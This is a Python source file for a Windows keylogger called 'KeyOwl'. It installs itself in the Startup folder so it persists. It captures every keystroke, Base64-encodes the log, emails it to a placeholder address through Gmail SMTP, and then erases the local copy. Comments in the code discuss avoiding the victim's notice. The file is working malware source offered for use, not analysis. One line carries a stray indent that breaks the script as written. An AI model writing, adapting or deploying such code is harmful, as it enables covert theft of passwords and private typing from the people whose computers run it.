import logging, datetime, smtplib, base64, os, winshell
from pynput.keyboard import Key, Listener
from win32com.client import Dispatch
from pathlib import Path

def create_shortcut():
    #If a startup shortcut doesn't exits it will create one.
    current_path = os.path.dirname(os.path.abspath(__file__))
    programs = winshell.programs()
    path = os.path.join(programs, "Startup", "KeyOwl.lnk")
    target = current_path + "\\KeyOwl.pyw" #Or KeyOwl.exe
    wdir = current_path
    icon = target
    check = Path(path)
    if not os.path.exists(check):
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(path)
        shortcut.Targetpath = target
        shortcut.WorkingDirectory = wdir
        shortcut.IconLocation = icon
        shortcut.save()
    else:
        pass
    
def check_file():
    #If the log.txt file exists, invokes the send_info() function.
    try:
        file = open("log.txt", "r+")
        logs = file.read()
        message = base64.b64encode(logs.encode()) #Encode to Base64.
        send_info(message)
        file.close()
    except:
        pass #If the file doesn't exist that's fine, it will be created later.

def send_info(message):
    #Sends the logs via Gmail
    subject = "KeyOwl"
    user = "your_e-mail@gmail.com"
    pwd = "your_password"
    receiver = ["email_to_receive@gmal.com"]
    text = message
    full_message = """From %s\nTo %s\nSubject %s\n%s""" % (user, ", ".join(receiver), subject, text)
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(user, pwd)
        server.sendmail(user, receiver, full_message) #Send the logs
        server.close()
        rewrite = open("log.txt", "w") #Delete everything in the log.txt file
        rewrite.close()                #Comment that out if there are problems.
    except:
        pass #There is nothing we can do.

def on_press(key):
    logging.info(str(key))
    
log_directory = "" #The directory that the log will be stored at.
                   #Leave Empty to store it in the directory of this file.
 run = True

create_shortcut() #At the beggining of the program execute this function.
check_file() #After create_shortcut() is finished this executes.
logging.basicConfig(filename = (log_directory + "log.txt"), level = logging.DEBUG, format = '%(asctime)s: %(message)s')

while run == True:                                  #If the user enters an invalid character
    with Listener(on_press = on_press) as listener: #this loop will prevent the program from crashing.
        try:                                        #The problem is, that this loop prevents the user of
            listener.join()                         #entering an invalid character. Thus the user might
        except:                                     #notice that something is wrong. If that's a problem
            pass #Not much to be done.              #remove this loop.
            
        
